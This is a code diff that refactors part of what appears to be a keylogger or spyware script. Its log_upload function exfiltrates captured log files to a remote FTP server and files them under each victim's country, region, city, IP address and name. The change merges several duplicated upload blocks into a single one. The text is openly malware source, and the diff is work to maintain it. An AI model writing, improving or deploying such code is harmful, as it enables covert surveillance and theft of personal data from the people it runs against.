@@ -28,8 +28,6 @@ fo = open(f_name, 'a')
 fo.close()
 if country == 'Bosnia and Herzegovina ':
     country = "Bosnia and Herzegovina"
-else:
-    pass
 
 # --------------------------------------------------- #
 # ---------------sending file to ftp server----------------- #
@@ -50,31 +48,18 @@ def log_upload(f_name):
                 ftp.cwd(city)
                 if ip in ftp.nlst():
                     ftp.cwd(ip)
-                    if victim in ftp.nlst():
-                        ftp.cwd(victim)
-                        ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
-                        ftp.quit()
-                    else:
+                    if victim not in ftp.nlst():
                         ftp.mkd(victim)
-                        ftp.cwd(victim)
-                        ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
-                        ftp.quit()
                 else:
                     ftp.mkd(ip)
                     ftp.cwd(ip)
                     ftp.mkd(victim)
-                    ftp.cwd(victim)
-                    ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
-                    ftp.quit()
             else:
                 ftp.mkd(city)
                 ftp.cwd(city)
                 ftp.mkd(ip)
                 ftp.cwd(ip)
                 ftp.mkd(victim)
-                ftp.cwd(victim)
-                ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
-                ftp.quit()
         else:
             ftp.mkd(region)
             ftp.cwd(region)
@@ -83,9 +68,6 @@ def log_upload(f_name):
             ftp.mkd(ip)
             ftp.cwd(ip)
             ftp.mkd(victim)
-            ftp.cwd(victim)
-            ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
-            ftp.quit()
     else:
         ftp.mkd(country)
         ftp.cwd(country)
@@ -96,9 +78,10 @@ def log_upload(f_name):
         ftp.mkd(ip)
         ftp.cwd(ip)
         ftp.mkd(victim)
-        ftp.cwd(victim)
-        ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
-        ftp.quit()
+
+    ftp.cwd(victim)
+    ftp.storbinary('STOR '+ filename, open(f_name, 'rb'))
+    ftp.quit()
     
 def clean_it():
     global f_name
